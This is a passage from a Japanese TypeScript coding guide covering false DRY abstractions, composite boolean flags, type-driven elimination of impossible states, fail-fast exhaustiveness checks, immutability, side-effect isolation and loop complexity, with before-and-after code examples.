一見きれいに DRY できたようで、名前まで付いている。だが `isEligibleForPerk`（優待ライン）は、**たまたま同じ数字なだけの2つの業務ルールを、1つの概念に見せかけた偽の抽象**だ。送料無料の基準は「物流コストを賄えるか」、ポイント2倍の基準は「マーケ施策の閾値」——決める部署も、変わる理由も別。ある日「夏だけ送料無料を3000円に下げる」施策が来た瞬間、"優待ライン"は片方だけ動かせず破綻し、`isEligibleForPerk(order, kind)` だの `if (kind === 'shipping')` だのが生えて、**無関係な2つの都合が1つの関数で綱引きを始める**。（似た構図をモジュール間で見たのが §4.5「ついでの依存」——あちらは"借りたい処理があるモジュールに丸ごと依存"、こちらは"似た式を1つの概念に括る"、どちらも「似ている＝同じ」の早合点だ。）

```ts
// ✓ 概念が違うなら、同じ数字でも分ける。各ルールが独立した基準（§3）を持てる
const FREE_SHIPPING_MIN = 5000;   // 物流都合で決まる
const DOUBLE_POINTS_MIN  = 5000;  // マーケ都合で決まる（今はたまたま同額なだけ）

function qualifiesForFreeShipping(order: Order): boolean {
  return order.total >= FREE_SHIPPING_MIN;
}
function qualifiesForDoublePoints(order: Order): boolean {
  return order.total >= DOUBLE_POINTS_MIN;
}
```

`5000` という値がいま一致しているのは**偶然**であって、`FREE_SHIPPING_MIN` と `DOUBLE_POINTS_MIN` は別概念。分けておけば、送料無料だけ 3000 に下げても、ポイント側は 5000 のまま揺るがない。逆に、もし本当に共通の**下位**概念があるとき——ただし今回の `total >= X` のように自明すぎる比較は切り出す価値がない——は、それが「両者が同じ理由で従う土台」であるときだけ部品化する。まとめる粒度は「見た目が同じ式」ではなく「同じ理由で変わる概念」で決める。

**"形が同じ"だけで、型やデータをまとめない**
同じ罠は、関数だけでなく**型（データの形）**でも起きる。会員登録フォームと、プロフィール編集フォームがあるとする。**両者は別々の画面で、それぞれ別の `<form>`（フォームの HTML）を持つ**——同じフォームを共通利用しているわけではない。今はたまたま入力がどちらも `{ name, email }` だ。

```ts
// ✗ 別々のフォームなのに、入力の形が同じだからと1つの型を共有してしまう
type UserForm = { name: string; email: string };

function submitSignup(form: UserForm) { /* アカウント作成 */ }
function submitProfileEdit(form: UserForm) { /* プロフィール更新 */ }
```

だが「登録フォーム」と「編集フォーム」は別概念だ。やがて登録側は `password` や `規約同意` を持ち、編集側は `bio`・`avatarUrl` が増え、`email` はむしろ変更不可になる——**変わる理由（アカウント作成 vs プロフィール管理）がまるで別**。共有した `UserForm` は両方の事情を抱えて `password?: string`・`bio?: string` と**任意フィールドだらけ**になり、使う側は「この画面ではこのフィールドは来ない」を毎回気にする羽目になる（§6.4「ありえない状態を型で作らない」の逆をやっている）。

```ts
// ✓ 概念が違うなら型も分ける。各フォームは自分に必要なフィールドだけを持つ
type SignupForm  = { name: string; email: string; password: string; agreedToTerms: boolean };
type ProfileForm = { name: string; bio: string; avatarUrl: string };
```

判定軸は関数のときと同じ——**「今そっくりか」ではなく「同じ理由で変わるか」**。形が偶然一致しているだけなら、たとえ今フィールドが同じでも分けておく。（逆に、両画面が**同じ `<form>` の HTML そのものを共通利用**しているなら、入力の型は1つで自然だ——"同じ1つのフォーム"という本物の共通概念が実在するからだ。ここはそれを共有していないので、`SignupForm` と `ProfileForm` を別々に設ける、という話。）

**目安**
- 重複を見つけても、**同じ理由で変わる**確信が持てるまで急いで括らない（俗に "3回現れてから"）。
- 「共通化したら分岐（フラグ・種別引数）が増えた」は、**違う概念を無理にまとめたサイン**。分けたほうが素直。
- コピペの重複（§5 で消すべきもの）と、**別概念のたまたまの一致**を混同しない。前者は括る、後者は分ける。

### 5.3 ボーイスカウトルール ── 来たときより少しだけきれいにして去る

§5.1 で資産を増やすのが前向きの改善なら、その裏側の習慣がこれだ。触ったファイルに見かけた小さな綻び（死んだコード、誤解を招く名前、マジックナンバー）は、その場で直して**来たときより少しだけきれいにして去る**。放っておくと小さな劣化が積もり、「開発が進むほど楽になる」がいつしか逆——触るほど辛くなる——に転じる。

ただし**本筋の変更に無関係な差分を混ぜない**。混ざるとレビューで「何が変わったか」が見えなくなる。掃除が大きくなるなら、別コミット／別PRに切る。

資産を増やす（§5.1）のも、こうして劣化を押し戻すのも、どちらも「**開発が進むほど楽になる**」状態を保つ習慣だ。

---

## 6. ロジックの書き方

> ここまでは「構造」の話だった。次は、その構造の中で書く一つひとつの**ロジック**を、どう素直に書くか。

大きく2つのまとまりがある。まず **判断と制御フロー**——何を根拠に判断し（6.1 直接的な論理展開）、複雑な条件を合成フラグに括り（6.2）、素直な流れに落とす（6.3 制御フロー）。続いて **書かなくてよい判断を締め出す**——ありえない状態は型で作らせず（6.4）、想定外は境界で止める（6.5）。

### 6.1 直接的な論理展開を意識する

`Aの場合、必ずBが成立し、その場合には必ずCとなる`（A ⇒ B ⇒ C）という前提があるとする。実装したいのは「**Aのとき X する**」だ。

A ⇒ B ⇒ C なのだから、C は A の"下流"にある。ここで、`if (A) X` と書く代わりに、下流の結果を使って **`if (C) X`（Cのとき X する）と書いてしまう場合**を考える。「Aのとき必ずCになる」のだから、一見これでも同じように動きそうに見える。だが、次の2点で危うい。

- **逆は保証されていない。** 前提が言っているのは「A ⇒ C」だけで、その逆「C ⇒ A（＝Cが成り立つのはAのときだけ）」は含まれていない。もし C が A 以外の理由でも成り立つなら、`if (C) X` は A と無関係な場面でも X を実行してしまう——"等価な別解"ではなく、ただのバグだ。
- **一致していても偶然にすぎない。** 仮に今は「C が成り立つのは実質 A のときだけ」で、A と C が同じ結果を選ぶ（必要十分条件である）としても、その一致は途中の B・C の実装に寄りかかった偶然でしかない。B や C の実装が変われば崩れる。

だから判定は、下流の結果 C ではなく、**本当に判定したい直接の原因 A で書く。**

**例1：退会判定**

```ts
// 前提: 退会済み(A)なら、必ず利用停止フラグが立ち(B)、必ずログイン不可(C)になる

// ✗ 遠回りな条件（結果を根拠に判定している）
if (!user.canLogin) {
  // ログインできなければ「退会済みです」という案内を画面に出す
  showWithdrawnMessage();
}

// ✓ 直接的な因果（本当に判定したいのは「退会済みか」）
if (user.isWithdrawn) {
  // 退会していれば「退会済みです」という案内を画面に出す
  showWithdrawnMessage();
}
```

**例2：在庫切れ判定**

```ts
// 前提: 在庫が0(A)なら、必ず販売ステータスが「売り切れ」になり(B)、必ず購入ボタンが disabled(C)

// ✗ UIの状態(結果)を根拠に業務判断している
if (isBuyButtonDisabled) {
  // 購入ボタンが非活性なので「再入荷のおすすめ表示」を抑制する
  suppressReorderSuggestion();
}

// ✓ 本当に判定したいのは「在庫が0か」という直接の原因
if (stock === 0) {
  // 在庫が無いので「再入荷のおすすめ表示」を抑制する
  suppressReorderSuggestion();
}
```

結果（`canLogin` / `isBuyButtonDisabled`）を根拠にすると、二重に危うい。**①その結果は A 以外の理由でも起こりうる**——ログイン不可はアカウント凍結や連続失敗ロックでも、ボタン非活性は未ログインや地域制限でも起こる。すると A と無関係な場面で X が撃たれる。**②仮に今は一致していても、途中の前提（B・C）の実装が変わった瞬間に崩れる。** 原因 A を直接見れば、この因果の連鎖にもう依存しない。

### 6.2 複雑な条件は"合成フラグ"に括る ── ただし1つの判断ぶんだけ

条件式が長くなったり否定が絡んだりすると、`if` の行を見ても「結局どういうときに真か」が掴めない。そこで**条件の"意味"に名前を与えて括り出す**——`canEdit` のような合成フラグにすると、フローが一目で読める（§3「名前が概念を表していれば、長い処理でもフローが読める」の条件版）。

```ts
// ✗ 何を判定しているのか、頭の中で論理を解かないと読めない
if (user.isActive && !user.isBanned && (user.plan === 'pro' || user.trialDaysLeft > 0)) {
  showEditor();
}

// ✗ 二重否定。「無効化されていない、が偽でない」…もう追えない
if (!(!user.isActive || user.isBanned)) { /* ... */ }
```

```ts
// ✓ 条件に概念名を与える。if の行が「何のときか」をそのまま読める
const hasUsablePlan = user.plan === 'pro' || user.trialDaysLeft > 0;
const canEdit = user.isActive && !user.isBanned && hasUsablePlan;
if (canEdit) showEditor();
```

- **ブールは肯定形で名付ける**。`isDisabled` を否定して回すより `isEnabled` を用意する。二重否定（`!isNotReady`）は、読み手が毎回ひっくり返す羽目になる。
- **長い条件は"意味の名前"に括り出す**。`canEdit`・`hasUsablePlan` のように、その条件が表す業務概念を名前にする。

**ただし、括ってよいのは「1つの判断」ぶんの材料だけ**

ここに一つだけ守る線がある——**合成フラグに束ねてよいのは、1つの判断に必要な材料だけ**。`canEdit` が読みやすいのは、"編集してよいか"という**単一の判断の材料だけ**を束ねているからだ。逆に、**別々の判断に属する材料を1つのフラグに混ぜ込む**と、読みやすくするはずの合成が、かえって判断を絡ませる。本質的な状態がすでに手元にあるのに、複数の判断をまたいだ"中間概念"をこしらえると、本来独立していた判断が絡まり、片方を使いたいたびにもう片方を打ち消す羽目になって、結局「何を判定しているのか」が見えなくなる。

例として、注文を処理する。判断材料は3つ。

- ① 入金済みか（`order.isPaid`）
- ② 在庫があるか（`order.stock > 0`）
- ③ 物流に遅延が生じているか（`order.hasLogisticsDelay`）

仕様はシンプルで、**出荷してよいか**は ①②（入金済み かつ 在庫あり）だけで決まり、**ユーザーへ連絡が要るか**は ③（遅延の有無）だけで決まる。この2つは本来まったく別の判断だ。

```ts
// ✗ ②(在庫有無)と③(遅延有無)を混ぜた「予定通り届く」という、本質的でない謎概念を発明している
function processOrder(order: Order): void {
  // 在庫があって遅延もない=予定通り届く、という②③をまたいだフラグ
  const willArriveOnTime = order.stock > 0 && !order.hasLogisticsDelay;

  if (order.isPaid && willArriveOnTime) {
    ship(order);                                            // 入金済みで、予定通りに届くなら出荷
  } else if (order.isPaid && order.stock > 0 && !willArriveOnTime) {
    ship(order);                                            // 入金済みで、在庫はあるが、予定通りには届かない…でも結局出荷はする
    notifyDelay(order.user);                                // ので、連絡だけ足す
  }
}
```

`willArriveOnTime` が ②(在庫)と③(遅延)を1つに混ぜてしまったせいで、**本来独立していた2つの判断が絡まる**。

- 出荷したいだけなら ①② を見ればいいのに、③まで含んだ `willArriveOnTime` を経由するので、「在庫はあるが遅延」を `order.stock > 0 && !willArriveOnTime` と**③をわざわざ打ち消して**作り直す羽目になる。
- 連絡の要否は ③ だけ見れば分かるのに、その ③ が `willArriveOnTime` に溶けているので、条件の掛け合わせを解かないと読めない。
- この else if を概念に分解すると、「入金済み」かつ「在庫がある」かつ（（「在庫がある」かつ「遅延がある」）わけではない）という複雑な判定になっている。

本来は下記のようにあるべきだ。
```ts
// ✓ 「出荷できるか(①②)」と「連絡が要るか(③)」は別概念。それぞれ独立に判定する
function processOrder(order: Order): void {
  const canShip = order.isPaid && order.stock > 0;      // 出荷可否は①②だけで決まる
  if (!canShip) return;

  ship(order);
  if (order.hasLogisticsDelay) {
    notifyDelay(order.user); // 連絡要否は③だけで決まる
  }
}
```

注目してほしいのは、`canShip` **自体も ①② を合成したフラグ**——`canEdit` と同じ"良い合成フラグ"だということ。それが不適切でないのは、"出荷してよいか"という**1つの判断が、まさに ①② の両方に依存している**からで、合成の範囲と判断の範囲がぴったり重なっている。一方 `willArriveOnTime` は、②(在庫)を"出荷"の判断に、③(遅延)を"連絡"の判断に——と**2つの別々の判断にまたがる材料**を1つに混ぜてしまった。だから片方を使いたいたびにもう片方を打ち消す作業が生まれ、処理が本質からじわじわ逸れる。

だから、名前を付けて括り出す前に一度問う——**「これは1つの判断に閉じた概念か、それとも複数の判断をまたいで混ぜた発明か」**。閉じているなら `canEdit`・`canShip` のように積極的に名前を与えてよい。またぐなら、`willArriveOnTime` のように束ねず、判断ごとに分けて書く。

### 6.3 素直な制御フロー

早期リターン（ガード節）でネストを浅く保ち、読み手の負担を減らす。

```ts
// ✗ ネストが深い
function process(user) {
  if (user) {
    if (user.isActive) {
      if (user.hasPermission) {
        // 本題
      }
    }
  }
}

// ✓ ガード節で早く返す
function process(user?: User) {
  if (!user?.isActive) return;
  if (!user.hasPermission) return;
  // 本題（ネストなし）
}
```

> ここまでは「判断と制御フローを素直に書く」話だった。残る2つは趣が変わり、**そもそも書かなくてよい判断を締め出す**——ありえない状態は型で作らせず（6.4）、想定外は境界で止める（6.5）。

### 6.4 型で「ありえない状態」を最初から排除する

TypeScriptの場合、実行時の存在チェック・`?.`（オプショナルチェーン）・`as` は、**型がゆるいことの尻ぬぐい**であることが多い。ドメイン上そのフィールドが必ず存在するなら、**型でそれを宣言してしまえば、防御コードそのものが不要になる。**

```ts
// ✗ 型が optional なので、使うたびに存在チェック・フォールバックが要る
interface Order { user?: User } // 実際は必ず購入者が紐づくのに optional にしている
const buyerName = order.user?.name || "ゲスト"; // ありえないケースへの防御が全箇所に散る

// ✓ 「注文には必ず購入者が紐づく」という事実を型で宣言する
interface Order { user: User }   // 必須にする
const buyerName = order.user.name; // 分岐もフォールバックも消える
```

同じことが `as` / `as any` にも言える。キャストを書きたくなったら、まず **「型を正しく付ければ、このキャスト自体が要らないのでは？」** と疑う。

```ts
// ✗ 種別ごとに payload の形は違うのに、型が any。使うたび as で「この形のはず」と決めつける
interface Action { type: string; payload: any }

function reduce(cart: Cart, action: Action): Cart {
  if (action.type === 'addItem') {
    const { productId, qty } = action.payload as { productId: string; qty: number }; // 決めつけ
    // ...（qty を number のつもりで使うが、実際に何が入っているかは型が保証しない）
  }
  // ...
}
```

```ts
// ✓ 「種別ごとに payload の形が決まる」を判別可能ユニオンで型に表す
type Action =
  | { type: 'addItem';    payload: { productId: string; qty: number } }
  | { type: 'removeItem'; payload: { productId: string } };

function reduce(cart: Cart, action: Action): Cart {
  if (action.type === 'addItem') {
    const { productId, qty } = action.payload; // 型が確定。as は要らない
    // ...
  }
  // ...
}
```

`as` が消えるだけではない。`type` と `payload` の対応が型で保証されるので、`removeItem` の分岐で `qty` を読もうとすれば**コンパイラが弾く**。`as` で書いていた「この形のはず」という決めつけを、型が事実として裏付けてくれる（§4.2「対等な列挙」を、付随データ込みで表したのが判別可能ユニオン）。

これは次項 §6.5（fail-fast）とひと続きの発想である。**目的のない防御は、コードで書かず、型で消す。** 「この値が無い／違う型である状態は、そもそも起こりうるのか？」を問い、起こりえないなら型でそう宣言してしまう。行き着く先は §1.1「いらないものは書かない」だ——**いちばん認知負荷が低いのは書かれていないコード**であり、防御コードもその例外ではない。起こりえない状態への防御は、型に語らせて丸ごと消すのが最善で、型は「書かずに済ませる」ための最強の道具になる。

### 6.5 想定外は早い段階で止める（fail-fast）

§6.4 では「起こりえない状態は型で消す」と述べた。だが型で守れるのは**自分たちのコードの内側**だけ。境界を越えて入ってくる値（API リクエスト・外部応答・環境変数）や、分岐の想定漏れは、実行時に初めて牙をむく。共通する構えは一つ——**「おかしい」と分かった瞬間に、その場で止める**。壊れた値を奥へ流さず、発生源のすぐ近くで顕在化させる。

外部入力を境界で検証して弾く（リクエストをスキーマ検証する等）のは、その当然の第一歩。ここで強調したいのは、より見落とされがちな**分岐の網羅**だ。`switch` の `default` で想定外を"それっぽい正常値"に化けさせると、壊れた値が下流へ静かに流れ、無関係な場所で damage になる。

```ts
type Status = 'todo' | 'doing' | 'done';

// ✗ 未対応を default で握りつぶす（fail-slow）。あとで 'canceled' を追加し、case を書き忘れると…
function progress(s: Status): number {
  switch (s) {
    case 'todo':  return 0;
    case 'doing': return 50;
    case 'done':  return 100;
    default:      return 0;   // ← 想定外を「0%」に化けさせる
  }
}
// progress('canceled') は 0 を返し、下流の集計が静かに狂う（エラーは出ない）
const rate = tasks.reduce((sum, t) => sum + progress(t.status), 0) / tasks.length;
```

```ts
// ✓ 想定外は即 throw（fail-fast）。'canceled' を渡した瞬間ここで落ち、原因の progress を直に指す
function progress(s: Status): number {
  switch (s) {
    case 'todo':  return 0;
    case 'doing': return 50;
    case 'done':  return 100;
    default:
      throw new Error(`未対応の status: ${s}`);
  }
}
```

`default: return 0` は一見「安全なフォールバック」だが、実は**想定外を正常値に化けさせる握りつぶし**（§10 で catch して 200 を返すのと同じ構図）。TypeScript なら `default` で、`never` を引数に取る `assertNever(s)` を呼べば、`Status` に値を足した瞬間**コンパイル時に** case 漏れを検出できる（§6.4「型で消す」）。

> **`never` で網羅を検査する仕組み**：`assertNever` は**引数の型が `never`**。全 case を処理し切ると `default` の `s` はコンパイラ上「残り候補ゼロ」＝ `never` 型になるので、`assertNever(s)` に渡せる。ところが `Status` に値を足して case を書き忘れると、`s` はその未処理の値（例：`'canceled'`）に絞り込まれ、`never` の引数へは渡せず**型エラー**になる——「処理し忘れがある」とコンパイラが名指ししてくれる。
>
> なお `never` によるチェックが効くのは**コンパイル時**だけ。型注釈は実行時には消えるので、型をすり抜けて実際に想定外の値が来る場合（DB の古い値・未検証の API レスポンスなど）に備え、`assertNever` は本体で `throw` もする。**`never`＝書き忘れの検出（コンパイル時）／`throw`＝想定外の値を止める（実行時）**、の二段構えになっている。

```ts
// 網羅チェックを関数にしておくと意図が明確（＋実行時の保険も兼ねる）
function assertNever(x: never): never {
  throw new Error(`未対応の値: ${x}`);
}

function progress(s: Status): number {
  switch (s) {
    case 'todo':  return 0;
    case 'doing': return 50;
    case 'done':  return 100;
    default:
      return assertNever(s); // 全 case 処理済みなら s は never 型 → never の引数に渡せて OK
      // Status に 'canceled' を足して case を書き忘れると、ここで s が 'canceled' に絞られ、
      // never の引数へ渡せず「'canceled' is not assignable to 'never'」＝コンパイルエラーになる
  }
}
```

fail-fast の効き目は、外部入力でも分岐でも同じ——**壊れた値の発生源と、それが表面化する場所を一致させられる**こと。奥深くで `NaN` になってから原因を遡るのではなく、生まれた場所で「これはおかしい」と止める。§10「握りつぶさない」と同じ思想だ。

---

## 7. 副作用と不変性

> 第2部のもう一つの土台。値が「いつ・どこで変わるか」を追わなくてよいコードは、それだけで認知負荷が低い。

ここまでの良い例——`filter`/`map`/`reduce`、`const` での宣言——はすべて、**入力から出力を計算するだけで、既存の値を書き換えない**書き方だった。その裏にある原理が「副作用を減らし、値を不変に保つ」。人はコードを読むとき、無意識に「今この変数には何が入っているか」を頭の中で追う。値が途中で書き換わるほど、この**追跡コスト**が跳ね上がる。

### 7.1 できるかぎり再代入しない（`let` より `const`）

**まず `const` で書く。`let` は「本当に再代入が要る」と示したいときだけ使う。** `let` が1つあるだけで、読み手は「この先どこかで値が変わるのでは」と身構え、変わる箇所を探しながら読む。`const` は「この名前の値は最後まで変わらない」という約束であり、それだけで追跡コストが消える。

```ts
// ✗ let で組み立て、条件ごとに再代入する。price が最終的にいくつか、上から追う必要がある
let price = order.amount;
if (order.isMember) price *= 0.9;
if (order.hasCoupon) price -= 500;

// ✓ 再代入をやめ、「計算の結果」を一度だけ束縛する。各名前の値は動かない
const memberPrice = order.isMember ? order.amount * 0.9 : order.amount;
const price = order.hasCoupon ? memberPrice - 500 : memberPrice;
```

`let` で少しずつ変えていきたくなったら、たいてい**その処理は関数として切り出せる**サイン。「`let` で積み上げる」を「値を返す関数」に置き換えられないか、まず疑う。たとえば、割引率を条件ごとに積み上げ、その先の長い処理でも使い続ける場合——

```ts
// ✗ discountRate を let で組み立て、その先の長い処理でもずっと使い続ける
function buildInvoice(order: Order): Invoice {
  const subtotal = sum(order.items.map(i => i.price));

  let discountRate = 0;                          // 条件ごとに積み上げる let
  if (order.isMember)     discountRate += 0.1;
  if (order.coupon)       discountRate += order.coupon.rate;
  if (discountRate > 0.3) discountRate = 0.3;    // 上限で丸める

  const discounted = subtotal * (1 - discountRate);
  const shipping   = discounted >= 5000 ? 0 : 500;
  // …この先ずっと discountRate が見えていて、「もう変わらない」と確信できない
  return { subtotal, discountRate, discounted, shipping };
}
```

「割引率を決める」というまとまりごと関数に切り出せば、`let` はその中に閉じ、呼び出し側は結果を `const` で受けられる。

```ts
// ✓ 積み上げロジックを関数へ。let は中に閉じ、呼び出し側は const で受ける
function discountRateFor(order: Order): number {
  let rate = 0;
  if (order.isMember) rate += 0.1;
  if (order.coupon)   rate += order.coupon.rate;
  return Math.min(rate, 0.3);                    // 上限。返した瞬間に確定する
}

function buildInvoice(order: Order): Invoice {
  const subtotal     = sum(order.items.map(i => i.price));
  const discountRate = discountRateFor(order);   // 確定値を一度だけ束縛
  const discounted   = subtotal * (1 - discountRate);
  const shipping     = discounted >= 5000 ? 0 : 500;
  return { subtotal, discountRate, discounted, shipping };
}
```

`let` そのものが消えるわけではない——積み上げの `let rate` は小さな関数の中に残る。だが `buildInvoice` 側では `discountRate` が **`const`＝もう動かない値**になり、後続の長い処理を"確定した値"の上で読める。おまけに `let` のスコープも数行に縮む（§7.3）。

- 迷ったら `const`。`let` を書くときは「なぜ再代入が要るのか」を一瞬考える。
- ループのカウンタなど、再代入が本質な場面はもちろんある。禁止ではなく、**既定を `const` に倒す**という話。

### 7.2 引数・オブジェクトを破壊的に変更しない

もう一段深いのが、**渡された配列やオブジェクトの中身を書き換えない**こと。`const` は再代入を防ぐが、`const arr = [...]` の中身は `push` や `sort` で変えられてしまう。呼び出し先が引数を書き換えると、**呼び出し側の値が知らないうちに変わり**、「なぜここでこの配列が変わった？」という最も追いにくいバグになる。

```ts
// ✗ 「価格の安い順に並べて返す」つもりが、渡された products をその場で破壊している
function sortByPrice(products: Product[]): Product[] {
  return products.sort((a, b) => a.price - b.price); // sort は元配列を並べ替える（新しい配列は作らない）
}
```

この副作用は、呼び出し側が同じ `newArrivals` を**別の用途でもう一度使う**ときに牙をむく。

```ts
const newArrivals = await fetchNewArrivals(); // API から「新着順」で受け取る
const cheapest = sortByPrice(newArrivals);    // 「価格の安い順」の一覧がほしくて呼ぶ

// 別の場所で「新着トップ5」を出したい。newArrivals はまだ新着順のまま、のつもり
showNewArrivals(newArrivals.slice(0, 5));     // ✗ newArrivals は sortByPrice の sort で価格順に並び替わっている
                                              //   → 新着5件のはずが「価格の安い5件」が表示される
```

`sortByPrice` の型 `(products: Product[]) => Product[]` は「配列を受け取り、配列を返す」としか語らず、**渡された配列を書き換えることを一言も宣言していない**。だから呼び出し側は「取得した並びは保たれる」と油断し、原因の特定に時間を溶かす。

```ts
// ✓ 元を壊さず、新しい配列を作って返す。呼び出し側の products は新着順のまま
function sortByPrice(products: Product[]): Product[] {
  return [...products].sort((a, b) => a.price - b.price); // コピーしてから並べ替え
}
```

こうすれば、後段の `newArrivals` は取得したときの新着順のまま。オブジェクトも同様に、書き換えではなく**新しい値を作って返す**（`{ ...user, name }`）。関数が「入れた値から新しい値を作るだけ」の**素直な計算**になり、呼び出し側は自分の値が勝手に変わらないと信頼できる。

> `sort`・`reverse`・`splice` は元配列を破壊する“罠”系。新しい配列を返す `toSorted`・`toReversed`・`toSpliced` や、スプレッド `[...arr]` でのコピーを既定にすると、この手の事故を根本から防げる。

### 7.3 変数のスコープを縮める

§7.1・7.2 は値そのものを書き換えないことで、値の**追跡コスト**を下げた。同じ追跡コストに効く小技が、**変数の"見える範囲（スコープ）"をできるだけ狭くする**こと——「**どこで**変わりうるか」を追う距離そのものを縮める。変数は、使う直前で宣言し、使い終わったら見えなくなるのが理想。スコープが広いほど、読み手は「この変数はこの先どこで読まれ／書かれるのか」を長い距離にわたって気にし続けねばならない。

- **使う場所の近くで宣言する。** 関数の先頭に変数をまとめて並べると、宣言と使用が離れ、間の全行がその変数の生存区間になる。
- **ブロックに閉じ込める。** 一時的な値は `if`／ループの中だけで完結させ、外に漏らさない。
- 広いスコープの `let` を1つ置くより、**狭いスコープで完結する関数に切り出す**ほうがたいてい素直（§2.2）。§7.1 の `discountRateFor` はその一石二鳥の例——積み上げの `let` が呼び出し側で `const` になり、`let` 自体のスコープも数行に縮んだ。

最後にしか使わない値を関数の先頭で宣言すると、その生存区間が関数全体に広がる。使う直前まで宣言を下ろすだけで、範囲は最小になる。

```ts
// ✗ 先頭で宣言。receipt は最後にしか使わないのに、関数全体で見えている
function checkout(order: Order) {
  const receipt = buildReceipt(order);   // ここで宣言し…
  validate(order);
  processPayment(order);
  // …長い処理…
  sendEmail(order.email, receipt);       // …使うのはやっとここ
}

// ✓ 使う直前で宣言。receipt の生存区間は最後の2行だけ
function checkout(order: Order) {
  validate(order);
  processPayment(order);
  // …長い処理…
  const receipt = buildReceipt(order);
  sendEmail(order.email, receipt);
}
```

スコープを縮めると、変数の「意味」も自然と1つに定まる（§4.2）。逆に、広いスコープに置かれた汎用的な名前（`tmp`・`data`・`result`）は、途中で意味が上書きされる温床になる。

### 7.4 副作用は端に寄せ、中心は純粋に保つ

ここまで（7.1〜7.3）は、個々の変数・値そのものの追跡コストを下げる話だった。最後は一段大きく——**副作用そのもの**を判断・計算から引き剥がす。DB 書き込み・API 送信・ログ・画面更新といった**副作用**そのものは無くせない。狙いは「関数を概念で分ける」こと自体ではなく、**面白いところ＝判断・計算（ロジック）を副作用から引き剥がし、純粋なまま一箇所に集める**こと。ロジックが I/O と絡み合っていると、①その判断を**単体で確かめられない**（DB や外部サービスを動かさないとテストできない）、②判断が `await` の合間に散らばって**全体像が読めない**。純粋な中心 ＋ 薄い実行層に分けると、この2つが同時に解ける。

例として、システムの指標(metrics)を見て、閾値に応じて通知・記録・オンコール呼び出しを行う処理を考える。

```ts
// ✗ 「閾値の判定（ロジック）」と「通知・記録（副作用）」が絡み合っている
async function checkMetrics(m: Metrics) {
  if (m.errorRate > 0.05) {
    await slack.send('#alerts', `エラー率が高い: ${m.errorRate}`); // 副作用
    await db.alerts.insert({ kind: 'errorRate', at: m.time });     // 副作用
  }
  if (m.cpu > 0.9 && m.errorRate > 0.05) {   // 判定条件が副作用の間に散らばる
    await pager.call('oncall');              // 副作用
  }
  // → 「どんな指標のとき何が起きるか」を試すだけで Slack・DB・PagerDuty を動かす羽目になり、
  //   判定ロジックを単体で確認できない。閾値の全体像も上下の await に埋もれて追いにくい
}
```

```ts
// ✓ 中心：入力から「何をすべきか」を決めるだけの純粋関数（副作用ゼロ）
type Action =
  | { type: 'slack';  text: string }
  | { type: 'record'; kind: string }
  | { type: 'page';   target: string };

function decideActions(m: Metrics): Action[] {   // 何度呼んでも同じ。閾値ロジックが一望できる
  const actions: Action[] = [];
  if (m.errorRate > 0.05) {
    actions.push({ type: 'slack', text: `エラー率が高い: ${m.errorRate}` });
    actions.push({ type: 'record', kind: 'errorRate' });
  }
  if (m.cpu > 0.9 && m.errorRate > 0.05) {
    actions.push({ type: 'page', target: 'oncall' });
  }
  return actions;
}

// 端：決まったことを実行するだけの薄い層（判定ロジックを持たない）
async function checkMetrics(m: Metrics) {
  for (const a of decideActions(m)) {
    if (a.type === 'slack')  await slack.send('#alerts', a.text);
    if (a.type === 'record') await db.alerts.insert({ kind: a.kind, at: m.time });
    if (a.type === 'page')   await pager.call(a.target);
  }
}
```

効き目は「関数が分かれた」ことではなく、**面白いこと（判断）が全部、外に触れない純粋な場所に集まった**ことにある。

- `decideActions` は入力だけで結果が決まるので、「エラー率6%＋CPU95%なら slack・record・page の3つ」を、**Slack も DB も動かさずテストで即確認できる**。
- 閾値ロジックが1関数に集約され、`await` に邪魔されず**条件の全体像を一望できる**。
- `checkMetrics`（端）は「決まったことを流すだけ」で分岐を持たないので、送信先や実行順を変えてもロジックは無傷。

純粋な中心と外に触れる端を分けるこの線引きは、§4.6「層の責務」が引く「値と見せ方」の線と似た形をしている（あちらは値と表示、こちらは値と副作用）。

> **まとめ**：既定は `const`、値は作り替えて返す、変数のスコープは狭く、副作用は端へ。どれも「**値がいつ・どこで変わるかを追わなくてよくする**」という一点に向かっている。第1部が概念の"かたち"を整えたなら、この章は概念が持つ"状態"を静かに保つ話。

---

## 8. パフォーマンス（計算量）

> ロジックが素直に書けたら、**計算量**にも一手だけ気を配る。計算量には**時間（速度）**と**空間（メモリ）**の2軸があり、どちらも「n が増えたときどう伸びるか」で見る。難しい最適化ではなく、習慣の話。

**ループの中でループしない。**

要素数1000の配列を、
- 単純にループ → 1000回
- ネストでループ → 100万回

①が0.01秒でも、②は10秒。②が画面表示・遷移時にあると致命的になる。
実務において size 1000 のネストは実際には稀で、せいぜい数十同士のネスト程度だろうが、**習慣として**ループの中でループを回さないようにする。

```ts
// ✗ O(n × m)：配列の中で毎回 find している
const result = orders.map(order => ({
  ...order,
  userName: users.find(u => u.id === order.userId)?.name, // ループの中のループ
}));

// ✓ O(n + m)：先に Map を作って引く
const userNameById = new Map(users.map(u => [u.id, u.name]));
const result = orders.map(order => ({
  ...order,
  userName: userNameById.get(order.userId),
}));
```

**「ループ」は `for` だけじゃない**

`filter`・`map`・`find`・`some`・`includes`・`indexOf` も、中身は配列を頭から舐める**ループ**。上の ✗ が O(n×m) なのは、まさに `map`（ループ）の中で `find`（ループ）を呼んでいるから。「明示的な `for` が無いから大丈夫」ではなく、**これらを別のループの中で呼んだ瞬間にネストになる**。

- 「含まれるか」を繰り返し引くなら `array.includes`（毎回 O(n) 走査）ではなく `Set`（O(1)）。
- 「id で引く」を繰り返すなら `array.find`（O(n)）ではなく `Map`（O(1)）——上の ✓ がそれ。

**見た目は1回でも、実は O(n) の操作**

とくに配列の**先頭**をいじる操作は、後ろの要素を全部ずらすので O(n)。**末尾**は O(1)。

```ts
arr.push(x);    // 末尾に追加 … O(1)
arr.pop();      // 末尾を削除 … O(1)
arr.unshift(x); // 先頭に追加 … O(n)（以降の全要素をずらす）
arr.shift();    // 先頭を削除 … O(n)
```

だから「先頭から1つずつ取り出す」を `while (arr.length) arr.shift()` で書くと、一回一回が O(n) で全体 O(n²)。同じく `result = [...result, x]` をループで積むのも、毎回まるごとコピーするので O(n²)（貯めたいだけなら `push`、変換なら `map`）。

**ループの中で「問い合わせ」しない（N+1）**

計算量の話は CPU だけでなく I/O でも同じ——むしろ I/O のほうが桁違いに痛い。

```ts
// ✗ 注文ごとに1回ずつ DB を叩く（N+1 問題）。100件なら 100 往復
for (const order of orders) {
  order.user = await db.users.findById(order.userId);
}

// ✓ 必要な id をまとめて1回で取り、Map で引く
const users = await db.users.findByIds(orders.map(o => o.userId));
const userById = new Map(users.map(u => [u.id, u]));
